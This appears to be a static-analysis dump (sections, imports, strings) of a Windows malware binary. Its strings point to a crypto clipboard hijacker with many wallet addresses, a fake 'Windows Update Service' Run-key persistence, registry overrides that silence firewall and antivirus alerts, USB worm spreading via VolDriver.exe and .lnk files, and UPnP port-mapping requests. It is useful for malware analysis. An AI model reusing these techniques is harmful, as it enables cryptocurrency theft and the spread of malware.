Missing bin header main
Missing bin header dwarf
[Sections]

nth paddr         size vaddr        vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000400  0xd200 0x00401000  0xe000 -r-x .text
1   0x0000d600  0x2e00 0x0040f000  0x3000 -r-- .rdata
2   0x00010400   0x800 0x00412000  0x2000 -rw- .data

[Segments]

nth paddr  size vaddr  vsize perm name
――――――――――――――――――――――――――――――――――――――

[Entrypoints]
vaddr=0x004058f0 paddr=0x00004cf0 haddr=0x00000120 type=program

1 entrypoints
[Constructors]

0 entrypoints
[Imports]
nth vaddr      bind type lib          name
16  0x0000d7c0 0x0040f1c0 NONE FUNC 0    USER32.dll   imp.CreateWindowExW
17  0x0000d7c4 0x0040f1c4 NONE FUNC 0    USER32.dll   imp.DispatchMessageA
18  0x0000d7c8 0x0040f1c8 NONE FUNC 0    USER32.dll   imp.OpenClipboard
19  0x0000d7cc 0x0040f1cc NONE FUNC 0    USER32.dll   imp.SetClipboardData
20  0x0000d7d0 0x0040f1d0 NONE FUNC 0    USER32.dll   imp.SetClipboardViewer
1   0x0000d600 0x0040f000 NONE FUNC 0    ADVAPI32.dll imp.RegSetValueExW
2   0x0000d604 0x0040f004 NONE FUNC 0    ADVAPI32.dll imp.CryptGenRandom
3   0x0000d608 0x0040f008 NONE FUNC 0    ADVAPI32.dll imp.CryptReleaseContext
4   0x0000d60c 0x0040f00c NONE FUNC 0    ADVAPI32.dll imp.CryptAcquireContextW
5   0x0000d610 0x0040f010 NONE FUNC 0    ADVAPI32.dll imp.RegQueryValueExW
6   0x0000d614 0x0040f014 NONE FUNC 0    ADVAPI32.dll imp.RegOpenKeyExA
7   0x0000d618 0x0040f018 NONE FUNC 0    ADVAPI32.dll imp.RegSetValueExA
8   0x0000d61c 0x0040f01c NONE FUNC 0    ADVAPI32.dll imp.RegCloseKey
9   0x0000d620 0x0040f020 NONE FUNC 0    ADVAPI32.dll imp.RegOpenKeyExW
1   0x0000d758 0x0040f158 NONE FUNC 0    SHELL32.dll  imp.ShellExecuteW
1   0x0000d8d4 0x0040f2d4 NONE FUNC 0    ole32.dll    imp.CoInitializeEx
2   0x0000d8d8 0x0040f2d8 NONE FUNC 0    ole32.dll    imp.CoCreateInstance
3   0x0000d8dc 0x0040f2dc NONE FUNC 0    ole32.dll    imp.CoInitialize
4   0x0000d8e0 0x0040f2e0 NONE FUNC 0    ole32.dll    imp.CoUninitialize
6   0x0000d74c 0x0040f14c NONE FUNC 0    OLEAUT32.dll imp.SysStringLen
2   0x0000d750 0x0040f150 NONE FUNC 0    OLEAUT32.dll imp.SysReAllocString
[Strings]
nth paddr      vaddr      len size section type    string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x0000d8f2 0x0040f2f2 4   5    .rdata  ascii   3)6{
1   0x0000d93f 0x0040f33f 4   5    .rdata  ascii   FUKR
2   0x0000d944 0x0040f344 4   10   .rdata  utf16le open
3   0x0000d950 0x0040f350 6   14   .rdata  utf16le %temp%
4   0x0000d960 0x0040f360 11  24   .rdata  utf16le %s\%d%d.exe
5   0x0000d978 0x0040f378 114 230  .rdata  utf16le Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
6   0x0000da60 0x0040f460 18  38   .rdata  utf16le %s:Zone.Identifier
7   0x0000da88 0x0040f488 9   20   .rdata  utf16le %s\%d.exe
8   0x0000da9c 0x0040f49c 18  38   .rdata  utf16le %s:Zone.Identifier
9   0x0000dac8 0x0040f4c8 15  16   .rdata  ascii   HTTP/1.1 200 OK
10  0x0000dad8 0x0040f4d8 10  11   .rdata  ascii   LOCATION: 
11  0x0000dae4 0x0040f4e4 15  16   .rdata  ascii   239.255.255.250
12  0x0000daf4 0x0040f4f4 4   10   .rdata  utf16le Body
13  0x0000db00 0x0040f500 135 136  .rdata  ascii   M-SEARCH * HTTP/1.1\r\nST:urn:schemas-upnp-org:device:InternetGatewayDevice:1\r\nMX: 3\r\nMan:"ssdp:discover"\r\nHOST: 239.255.255.250:1900\r\n\r\n
14  0x0000db88 0x0040f588 7   16   .rdata  utf16le service
15  0x0000db98 0x0040f598 11  24   .rdata  utf16le serviceType
16  0x0000dbb0 0x0040f5b0 11  24   .rdata  utf16le serviceList
17  0x0000dbc8 0x0040f5c8 6   14   .rdata  utf16le device
18  0x0000dbd8 0x0040f5d8 10  22   .rdata  utf16le deviceType
19  0x0000dbf0 0x0040f5f0 10  22   .rdata  utf16le deviceList
20  0x0000dc08 0x0040f608 51  104  .rdata  utf16le urn:schemas-upnp-org:device:InternetGatewayDevice:1
21  0x0000dc70 0x0040f670 39  80   .rdata  utf16le urn:schemas-upnp-org:device:WANDevice:1
22  0x0000dcc0 0x0040f6c0 49  100  .rdata  utf16le urn:schemas-upnp-org:device:WANConnectionDevice:1
23  0x0000dd24 0x0040f724 28  58   .rdata  utf16le GetExternalIPAddressResponse
24  0x0000dd60 0x0040f760 46  94   .rdata  utf16le urn:schemas-upnp-org:service:WANIPConnection:1
25  0x0000ddc0 0x0040f7c0 47  96   .rdata  utf16le urn:schemas-upnp-org:service:WANPPPConnection:1
26  0x0000de20 0x0040f820 10  22   .rdata  utf16le controlURL
27  0x0000de38 0x0040f838 7   16   .rdata  utf16le URLBase
28  0x0000de48 0x0040f848 4   5    .rdata  ascii   %S%S
29  0x0000de50 0x0040f850 46  47   .rdata  ascii   Mozilla/4.0 (compatible; UPnP/1.0; Windows 9x)
30  0x0000de80 0x0040f880 4   5    .rdata  ascii   POST
31  0x0000de88 0x0040f888 103 104  .rdata  ascii   Content-Type: text/xml; charset="utf-8"\r\nConnection: Close\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n
32  0x0000def0 0x0040f8f0 303 304  .rdata  ascii   <?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><m:GetExternalIPAddress xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1"/></SOAP-ENV:Body></SOAP-ENV:Envelope>\r\n\r\n
33  0x0000e020 0x0040fa20 81  82   .rdata  ascii   SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#GetExternalIPAddress"
34  0x0000e074 0x0040fa74 20  42   .rdata  utf16le NewExternalIPAddress
35  0x0000e0a0 0x0040faa0 641 642  .rdata  ascii   <?xml version="1.0"?>\r\n<SOAP-ENV:Envelope\r\n xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"\r\n SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n<SOAP-ENV:Body>\r\n<m:AddPortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n<NewRemoteHost></NewRemoteHost>\r\n<NewExternalPort>%d</NewExternalPort>\r\n<NewProtocol>%s</NewProtocol>\r\n<NewInternalPort>%d</NewInternalPort>\r\n<NewInternalClient>%s</NewInternalClient>\r\n<NewEnabled>1</NewEnabled>\r\n<NewPortMappingDescription></NewPortMappingDescription>\r\n<NewLeaseDuration>0</NewLeaseDuration>\r\n</m:AddPortMapping>\r\n</SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n\r\n
36  0x0000e328 0x0040fd28 75  76   .rdata  ascii   SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
37  0x0000e378 0x0040fd78 442 443  .rdata  ascii   <?xml version="1.0"?>\r\n<SOAP-ENV:Envelope\r\n xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"\r\n SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n<SOAP-ENV:Body>\r\n<m:DeletePortMapping xmlns:m="urn:schemas-upnp-org:service:WANIPConnection:1">\r\n<NewRemoteHost>%s</NewRemoteHost>\r\n<NewExternalPort>%d</NewExternalPort>\r\n<NewProtocol>%s</NewProtocol>\r\n</m:DeletePortMapping>\r\n</SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n\r\n
38  0x0000e538 0x0040ff38 78  79   .rdata  ascii   SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#DeletePortMapping"
39  0x0000e594 0x0040ff94 6   7    .rdata  ascii   twizt)
40  0x0000e59c 0x0040ff9c 6   7    .rdata  ascii   twizt)
41  0x0000e5a4 0x0040ffa4 6   7    .rdata  ascii   twizt)
42  0x0000e5ac 0x0040ffac 6   7    .rdata  ascii   twizt)
43  0x0000e5b4 0x0040ffb4 24  25   .rdata  ascii   www.update.microsoft.com
44  0x0000e5d9 0x0040ffd9 8   11   .rdata  utf8    Ȫ4d(2dwh blocks=Latin Extended-B,Basic Latin
45  0x0000e60f 0x0041000f 5   6    .rdata  ascii   T1`m\n
46  0x0000e617 0x00410017 4   5    .rdata  ascii   J\r."
47  0x0000e643 0x00410043 5   6    .rdata  ascii   c"5o\r
48  0x0000e657 0x00410057 8   9    .rdata  ascii   shttp://
49  0x0000e660 0x00410060 7   8    .rdata  ascii   bmhbmhb
50  0x0000e668 0x00410068 12  26   .rdata  utf16le wupdsvcs.exe
51  0x0000e688 0x00410088 32  66   .rdata  utf16le Microsoft Windows Update Service
52  0x0000e6cc 0x004100cc 18  38   .rdata  utf16le %s:Zone.Identifier
53  0x0000e6f4 0x004100f4 13  28   .rdata  utf16le %userprofile%
54  0x0000e710 0x00410110 12  26   .rdata  utf16le wupdsvcs.exe
55  0x0000e72c 0x0041012c 8   18   .rdata  utf16le %windir%
56  0x0000e740 0x00410140 5   12   .rdata  utf16le %s\%s
57  0x0000e74c 0x0041014c 5   12   .rdata  utf16le %s\%s
58  0x0000e758 0x00410158 46  94   .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Run\
59  0x0000e7b8 0x004101b8 46  94   .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Run\
60  0x0000e818 0x00410218 34  35   .rdata  ascii   SOFTWARE\Microsoft\Security Center
61  0x0000e83c 0x0041023c 16  17   .rdata  ascii   FirewallOverride
62  0x0000e850 0x00410250 21  22   .rdata  ascii   FirewallDisableNotify
63  0x0000e868 0x00410268 19  20   .rdata  ascii   AntiSpywareOverride
64  0x0000e87c 0x0041027c 17  18   .rdata  ascii   AntiVirusOverride
65  0x0000e890 0x00410290 22  23   .rdata  ascii   AntiVirusDisableNotify
66  0x0000e8a8 0x004102a8 15  16   .rdata  ascii   UpdatesOverride
67  0x0000e8b8 0x004102b8 20  21   .rdata  ascii   UpdatesDisableNotify
68  0x0000e8d0 0x004102d0 38  39   .rdata  ascii   SOFTWARE\Microsoft\Security Center\Svc
69  0x0000e8f8 0x004102f8 16  17   .rdata  ascii   FirewallOverride
70  0x0000e90c 0x0041030c 21  22   .rdata  ascii   FirewallDisableNotify
71  0x0000e924 0x00410324 19  20   .rdata  ascii   AntiSpywareOverride
72  0x0000e938 0x00410338 17  18   .rdata  ascii   AntiVirusOverride
73  0x0000e94c 0x0041034c 22  23   .rdata  ascii   AntiVirusDisableNotify
74  0x0000e964 0x00410364 15  16   .rdata  ascii   UpdatesOverride
75  0x0000e974 0x00410374 20  21   .rdata  ascii   UpdatesDisableNotify
76  0x0000e98c 0x0041038c 15  32   .rdata  utf16le %s\nodescfg.dat
77  0x0000e9ac 0x004103ac 13  28   .rdata  utf16le %s\cmdcfg.dat
78  0x0000e9c8 0x004103c8 21  44   .rdata  utf16le Microsoft Corporation
79  0x0000e9f4 0x004103f4 4   10   .rdata  utf16le \??\
80  0x0000ea00 0x00410400 59  120  .rdata  utf16le Software\Microsoft\Windows\CurrentVersion\Policies\Explorer
81  0x0000ea78 0x00410478 8   18   .rdata  utf16le NoDrives
82  0x0000ea90 0x00410490 40  82   .rdata  utf16le /c start .\%s & start .\%s\VolDriver.exe
83  0x0000eae4 0x004104e4 25  52   .rdata  utf16le %windir%\system32\cmd.exe
84  0x0000eb18 0x00410518 4   10   .rdata  utf16le %s\*
85  0x0000eb30 0x00410530 5   12   .rdata  utf16le %s\%s
86  0x0000eb3c 0x0041053c 5   12   .rdata  utf16le %s\%s
87  0x0000eb48 0x00410548 6   14   .rdata  utf16le %s.lnk
88  0x0000eb58 0x00410558 5   12   .rdata  utf16le %s\%s
89  0x0000eb64 0x00410564 19  40   .rdata  utf16le %s\%s\VolDriver.exe
90  0x0000eb8c 0x0041058c 5   12   .rdata  utf16le %s\%s
91  0x0000eb98 0x00410598 4   10   .rdata  utf16le %s\*
92  0x0000eba4 0x004105a4 11  24   .rdata  utf16le shell32.dll
93  0x0000ebbc 0x004105bc 11  24   .rdata  utf16le shell32.dll
94  0x0000ebd4 0x004105d4 5   12   .rdata  utf16le *.lnk
95  0x0000ebe0 0x004105e0 5   12   .rdata  utf16le *.vbs
96  0x0000ebec 0x004105ec 4   10   .rdata  utf16le *.js
97  0x0000ebf8 0x004105f8 10  22   .rdata  utf16le *.inf*.scr
98  0x0000ec10 0x00410610 5   12   .rdata  utf16le *.com
99  0x0000ec1c 0x0041061c 5   12   .rdata  utf16le *.jse
100 0x0000ec28 0x00410628 5   12   .rdata  utf16le *.cmd
101 0x0000ec34 0x00410634 5   12   .rdata  utf16le *.pif
102 0x0000ec40 0x00410640 5   12   .rdata  utf16le *.jar
103 0x0000ec4c 0x0041064c 5   12   .rdata  utf16le *.dll
104 0x0000ec58 0x00410658 5   12   .rdata  utf16le *.vbe
105 0x0000ec64 0x00410664 5   12   .rdata  utf16le *.bat
106 0x0000ec70 0x00410670 9   20   .rdata  utf16le Thumbs.db
107 0x0000ec84 0x00410684 12  26   .rdata  utf16le $RECYCLE.BIN
108 0x0000eca0 0x004106a0 11  24   .rdata  utf16le desktop.ini
109 0x0000ecb8 0x004106b8 25  52   .rdata  utf16le System Volume Information
110 0x0000ecf8 0x004106f8 5   12   .rdata  utf16le %s\%s
111 0x0000ed04 0x00410704 5   12   .rdata  utf16le %s\%s
112 0x0000ed10 0x00410710 8   18   .rdata  utf16le %s\%s\%s
113 0x0000ed24 0x00410724 7   16   .rdata  utf16le  (%dGB)
114 0x0000ed34 0x00410734 14  30   .rdata  utf16le Unnamed volume
115 0x0000ed54 0x00410754 4   10   .rdata  utf16le %s%s
116 0x0000ed60 0x00410760 12  26   .rdata  utf16le bitcoincash:
117 0x0000ed7c 0x0041077c 6   14   .rdata  utf16le cosmos
118 0x0000ed8c 0x0041078c 4   10   .rdata  utf16le addr
119 0x0000ed98 0x00410798 12  26   .rdata  utf16le bitcoincash:
120 0x0000edb4 0x004107b4 21  22   .rdata  ascii   14673222387840093601L
121 0x0000edcc 0x004107cc 48  49   .rdata  ascii   12gcwY6q4pv4DBbEjeQXwbhDBesLDc755VE2kyzzXRtvBvzd
122 0x0000ee00 0x00410800 34  35   .rdata  ascii   18xjALsLW57DQcXSgvGE8H9iXkXYvPjSWc
123 0x0000ee24 0x00410824 35  36   .rdata  ascii   3PLk48rqFRT7ZB2GZVHMJE5aiHr5jjBfZcw
124 0x0000ee48 0x00410848 34  35   .rdata  ascii   39t2ndtRZKxHPHaprbe6kPaws4vs1nWA94
125 0x0000ee6c 0x0041086c 42  43   .rdata  ascii   qz9vrpv9h2j5e6fsqwwsh8e9aaumwvql956ynh9rs9
126 0x0000ee98 0x00410898 34  35   .rdata  ascii   XmgkLqGXu8HGU7tTbbwWvaJYrgvybx3eZE
127 0x0000eebc 0x004108bc 34  35   .rdata  ascii   DSVC6eMqTCpkaMkCVp6Yn2U7FYkU76VhKB
128 0x0000eee0 0x004108e0 42  43   .rdata  ascii   0xd4F8DfD1cDBa76e9ac6b3b31Ef3C6C6c3D1ea1d0
129 0x0000ef0c 0x0041090c 34  35   .rdata  ascii   LXz2Jhi73bna54msz2zpsEpRVAh8KbeYRL
130 0x0000ef30 0x00410930 34  35   .rdata  ascii   rPTusqR9SMoh7QuYfJ3EJF7Ewogp6HVJEt
131 0x0000ef54 0x00410954 34  35   .rdata  ascii   TCW3T7UyyN3MWqakTPViWVRAL1kGsYyTL6
132 0x0000ef78 0x00410978 35  36   .rdata  ascii   t1gE3Hz4ivvEAQMWagv5XuUMkUPcnNkuNGB
133 0x0000ef9c 0x0041099c 36  37   .rdata  ascii   tz1U9d1x7U3AEMw8UPSVMtEH4u9eShBX6prG
134 0x0000efc4 0x004109c4 42  43   .rdata  ascii   hxd697fe63e8c4d138cd47d9cdbff6bbf6facbd1fb
135 0x0000eff0 0x004109f0 34  35   .rdata  ascii   QQeW6TaSKUA9yuG2mPKMd6epoXa6vnRqh6
136 0x0000f014 0x00410a14 34  35   .rdata  ascii   RRqRTmr9WDk2LdTn7mfMHXofz1XaoTrG3C
137 0x0000f038 0x00410a38 40  41   .rdata  ascii   NBGLRULGKDFPLIDQZRDQOORKONAV5VRWOV3CDGJW
138 0x0000f064 0x00410a64 34  35   .rdata  ascii   AUpwoQdnjVynLKhDkNt1TJh6sgduJnxyJy
139 0x0000f088 0x00410a88 34  35   .rdata  ascii   SNjNq8EbkPcfEqQtE6FTM5eftqS33otZY4
140 0x0000f0b0 0x00410ab0 78  79   .rdata  ascii   zs1gdxkmsegruyeu72ehpfwgshmcup4sqxm7kafju9r7xjcfww8vlg7ar9rqraxmjhr9rdn2hj9v7w
141 0x0000f100 0x00410b00 42  43   .rdata  ascii   zil1afs50sm4fe7ulsdygvvl7x6tygtcwmkrqtzqlq
142 0x0000f12c 0x00410b2c 35  36   .rdata  ascii   s1iibbBPLCP843XGjxRxoT9Skk542HMLU5v
143 0x0000f150 0x00410b50 11  24   .rdata  utf16le bitcoincash
144 0x0000f168 0x00410b68 54  55   .rdata  ascii   bitcoincash:qz9vrpv9h2j5e6fsqwwsh8e9aaumwvql956ynh9rs9
145 0x0000f1a0 0x00410ba0 6   14   .rdata  utf16le cosmos
146 0x0000f1b0 0x00410bb0 45  46   .rdata  ascii   cosmos1j2j4n8mn2al28g62uzsrf9jhhqjsdpr58et5j4
147 0x0000f1e0 0x00410be0 95  96   .rdata  ascii   46wi3NQz8eWV9HnGGKtpqKFcyGqWvLXsRP9C4oh3FgJ8M11QzmSrWWu6hW2kdredmQDYFjkJNg8t4Lye6vPuRcCsK71DPYr
148 0x0000f240 0x00410c40 4   10   .rdata  utf16le addr
149 0x0000f250 0x00410c50 103 104  .rdata  ascii   addr1qx6957p39d7v53mvqe7gqc62eazsmmxhlth870590x9v8mq0pjv9yx5jd4sgndnt87zmdutq87r8xh0m8pn65k2p9yasl4vamq
150 0x0000f2b8 0x00410cb8 34  35   .rdata  ascii   Fd8ScFbi4ZnkrDYZa2Fhanx3BuoWXFzDaG
151 0x0000f2dc 0x00410cdc 56  57   .rdata  ascii   GAWB6FUMRQBOF4JSVWAH6GO26C24UL5P44G3LDWK46WMFAS2TAZD7EBC
152 0x0000f318 0x00410d18 34  35   .rdata  ascii   GLnwYTx21SBA1XAsBqtFumkDMpB97tmqsp
153 0x0000f344 0x00410d44 42  43   .rdata  ascii   bnb1yzw7m55vrhqmmw2e0xpven8q49u8m63prv3hhz
154 0x0000f370 0x00410d70 4   10   .rdata  utf16le band
155 0x0000f37c 0x00410d7c 43  44   .rdata  ascii   band1ecl9c2w2dtxx70pewvsl6le3sd8srrlg36vthx
156 0x0000f3b0 0x00410db0 42  43   .rdata  ascii   bc1q4eym03072yk0zahdm9jym28vk0dxwyvs57sr6g
157 0x0000f3dc 0x00410ddc 9   10   .rdata  ascii   U30212907
158 0x0000f3e8 0x00410de8 9   10   .rdata  ascii   E30940134
159 0x0000f3f4 0x00410df4 9   10   .rdata  ascii   B30912949
160 0x0000f400 0x00410e00 4   10   .rdata  utf16le %x%X
161 0x0000f40e 0x00410e0e 4   5    .rdata  ascii   L09n
162 0x0000f430 0x00410e30 4   5    .rdata  ascii   b'kJ
163 0x0000f890 0x00411290 10  11   .rdata  ascii   WS2_32.dll
164 0x0000f89e 0x0041129e 7   8    .rdata  ascii   StrStrW
165 0x0000f8a8 0x004112a8 15  16   .rdata  ascii   PathFileExistsW
166 0x0000f8ba 0x004112ba 8   9    .rdata  ascii   StrCmpNW
167 0x0000f8c6 0x004112c6 14  15   .rdata  ascii   PathMatchSpecW
168 0x0000f8d8 0x004112d8 17  18   .rdata  ascii   PathFindFileNameW
169 0x0000f8ec 0x004112ec 8   9    .rdata  ascii   StrStrIA
170 0x0000f8f8 0x004112f8 7   8    .rdata  ascii   StrChrA
171 0x0000f902 0x00411302 9   10   .rdata  ascii   StrCmpNIA
172 0x0000f90c 0x0041130c 11  12   .rdata  ascii   SHLWAPI.dll
173 0x0000f91a 0x0041131a 18  19   .rdata  ascii   URLDownloadToFileW
174 0x0000f92e 0x0041132e 10  11   .rdata  ascii   urlmon.dll
175 0x0000f93c 0x0041133c 16  17   .rdata  ascii   InternetConnectA
176 0x0000f950 0x00411350 17  18   .rdata  ascii   InternetCrackUrlA
177 0x0000f964 0x00411364 16  17   .rdata  ascii   InternetReadFile
178 0x0000f978 0x00411378 16  17   .rdata  ascii   HttpOpenRequestA
179 0x0000f98c 0x0041138c 22  23   .rdata  ascii   HttpAddRequestHeadersA
180 0x0000f9a6 0x004113a6 16  17   .rdata  ascii   HttpSendRequestA
181 0x0000f9ba 0x004113ba 13  14   .rdata  ascii   InternetOpenA
182 0x0000f9ca 0x004113ca 19  20   .rdata  ascii   InternetCloseHandle
183 0x0000f9e0 0x004113e0 13  14   .rdata  ascii   InternetOpenW
184 0x0000f9f0 0x004113f0 16  17   .rdata  ascii   InternetOpenUrlW
185 0x0000fa02 0x00411402 11  12   .rdata  ascii   WININET.dll
186 0x0000fa10 0x00411410 7   8    .rdata  ascii   isalpha
187 0x0000fa1a 0x0041141a 7   8    .rdata  ascii   isdigit
188 0x0000fa24 0x00411424 6   7    .rdata  ascii   strstr
189 0x0000fa2e 0x0041142e 7   8    .rdata  ascii   memmove
190 0x0000fa38 0x00411438 17  18   .rdata  ascii   NtQuerySystemTime
191 0x0000fa4c 0x0041144c 25  26   .rdata  ascii   RtlTimeToSecondsSince1980
192 0x0000fa68 0x00411468 8   9    .rdata  ascii   mbstowcs
193 0x0000fa72 0x00411472 9   10   .rdata  ascii   ntdll.dll
194 0x0000fa7e 0x0041147e 10  11   .rdata  ascii   _vscprintf
195 0x0000fa8c 0x0041148c 4   5    .rdata  ascii   rand
196 0x0000fa94 0x00411494 5   6    .rdata  ascii   srand
197 0x0000fa9a 0x0041149a 10  11   .rdata  ascii   msvcrt.dll
198 0x0000faa8 0x004114a8 8   9    .rdata  ascii   lstrlenA
199 0x0000fab4 0x004114b4 10  11   .rdata  ascii   GlobalLock
200 0x0000fac2 0x004114c2 16  17   .rdata  ascii   GetModuleHandleW
201 0x0000fad6 0x004114d6 12  13   .rdata  ascii   GetTickCount
202 0x0000fae6 0x004114e6 11  12   .rdata  ascii   GlobalAlloc
203 0x0000faf4 0x004114f4 5   6    .rdata  ascii   Sleep
204 0x0000fafc 0x004114fc 9   10   .rdata  ascii   lstrcpynW
205 0x0000fb08 0x00411508 10  11   .rdata  ascii   ExitThread
206 0x0000fb16 0x00411516 19  20   .rdata  ascii   MultiByteToWideChar
207 0x0000fb2c 0x0041152c 8   9    .rdata  ascii   lstrlenW
208 0x0000fb38 0x00411538 12  13   .rdata  ascii   GlobalUnlock
209 0x0000fb48 0x00411548 11  12   .rdata  ascii   GetFileSize
210 0x0000fb56 0x00411556 13  14   .rdata  ascii   MapViewOfFile
211 0x0000fb66 0x00411566 15  16   .rdata  ascii   UnmapViewOfFile
212 0x0000fb78 0x00411578 9   10   .rdata  ascii   WriteFile
213 0x0000fb84 0x00411584 25  26   .rdata  ascii   InitializeCriticalSection
214 0x0000fba0 0x004115a0 20  21   .rdata  ascii   LeaveCriticalSection
215 0x0000fbb8 0x004115b8 11  12   .rdata  ascii   CreateFileW
216 0x0000fbc6 0x004115c6 16  17   .rdata  ascii   FlushFileBuffers
217 0x0000fbda 0x004115da 20  21   .rdata  ascii   EnterCriticalSection
218 0x0000fbf2 0x004115f2 18  19   .rdata  ascii   CreateFileMappingW
219 0x0000fc08 0x00411608 11  12   .rdata  ascii   CloseHandle
220 0x0000fc16 0x00411616 14  15   .rdata  ascii   FindFirstFileW
221 0x0000fc28 0x00411628 13  14   .rdata  ascii   GetDriveTypeW
222 0x0000fc38 0x00411638 11  12   .rdata  ascii   MoveFileExW
223 0x0000fc46 0x00411646 16  17   .rdata  ascii   CreateDirectoryW
224 0x0000fc5a 0x0041165a 16  17   .rdata  ascii   GetLogicalDrives
225 0x0000fc6e 0x0041166e 9   10   .rdata  ascii   CopyFileW
226 0x0000fc7a 0x0041167a 18  19   .rdata  ascii   GetModuleFileNameW
227 0x0000fc90 0x00411690 8   9    .rdata  ascii   lstrcmpW
228 0x0000fc9c 0x0041169c 9   10   .rdata  ascii   FindClose
229 0x0000fca8 0x004116a8 16  17   .rdata  ascii   RemoveDirectoryW
230 0x0000fcbc 0x004116bc 15  16   .rdata  ascii   QueryDosDeviceW
231 0x0000fcce 0x004116ce 9   10   .rdata  ascii   lstrcmpiW
232 0x0000fcda 0x004116da 13  14   .rdata  ascii   FindNextFileW
233 0x0000fcea 0x004116ea 19  20   .rdata  ascii   GetDiskFreeSpaceExW
234 0x0000fd00 0x00411700 11  12   .rdata  ascii   DeleteFileW
235 0x0000fd0e 0x0041170e 8   9    .rdata  ascii   lstrcpyW
236 0x0000fd1a 0x0041171a 18  19   .rdata  ascii   SetFileAttributesW
237 0x0000fd30 0x00411730 21  22   .rdata  ascii   GetVolumeInformationW
238 0x0000fd48 0x00411748 11  12   .rdata  ascii   ExitProcess
239 0x0000fd56 0x00411756 12  13   .rdata  ascii   CreateEventA
240 0x0000fd66 0x00411766 12  13   .rdata  ascii   GetLastError
241 0x0000fd76 0x00411776 12  13   .rdata  ascii   CreateMutexA
242 0x0000fd86 0x00411786 12  13   .rdata  ascii   CreateThread
243 0x0000fd96 0x00411796 25  26   .rdata  ascii   ExpandEnvironmentStringsW
244 0x0000fdb2 0x004117b2 11  12   .rdata  ascii   HeapReAlloc
245 0x0000fdc0 0x004117c0 9   10   .rdata  ascii   HeapAlloc
246 0x0000fdcc 0x004117cc 8   9    .rdata  ascii   HeapFree
247 0x0000fdd8 0x004117d8 10  11   .rdata  ascii   HeapCreate
248 0x0000fde6 0x004117e6 12  13   .rdata  ascii   HeapValidate
249 0x0000fdf6 0x004117f6 15  16   .rdata  ascii   GetProcessHeaps
250 0x0000fe08 0x00411808 18  19   .rdata  ascii   HeapSetInformation
251 0x0000fe1e 0x0041181e 19  20   .rdata  ascii   GetCurrentProcessId
252 0x0000fe34 0x00411834 20  21   .rdata  ascii   InterlockedDecrement
253 0x0000fe4c 0x0041184c 19  20   .rdata  ascii   WaitForSingleObject
254 0x0000fe62 0x00411862 19  20   .rdata  ascii   InterlockedExchange
255 0x0000fe78 0x00411878 20  21   .rdata  ascii   InterlockedIncrement
256 0x0000fe90 0x00411890 22  23   .rdata  ascii   InterlockedExchangeAdd
257 0x0000feaa 0x004118aa 17  18   .rdata  ascii   GetCurrentProcess
258 0x0000febe 0x004118be 16  17   .rdata  ascii   GetCurrentThread
259 0x0000fed2 0x004118d2 17  18   .rdata  ascii   SetThreadPriority
260 0x0000fee6 0x004118e6 17  18   .rdata  ascii   GetThreadPriority
261 0x0000fefa 0x004118fa 21  22   .rdata  ascii   DeleteCriticalSection
262 0x0000ff12 0x00411912 15  16   .rdata  ascii   DuplicateHandle
263 0x0000ff24 0x00411924 14  15   .rdata  ascii   GetLocaleInfoA
264 0x0000ff36 0x00411936 14  15   .rdata  ascii   CreateProcessW
265 0x0000ff46 0x00411946 12  13   .rdata  ascii   KERNEL32.dll
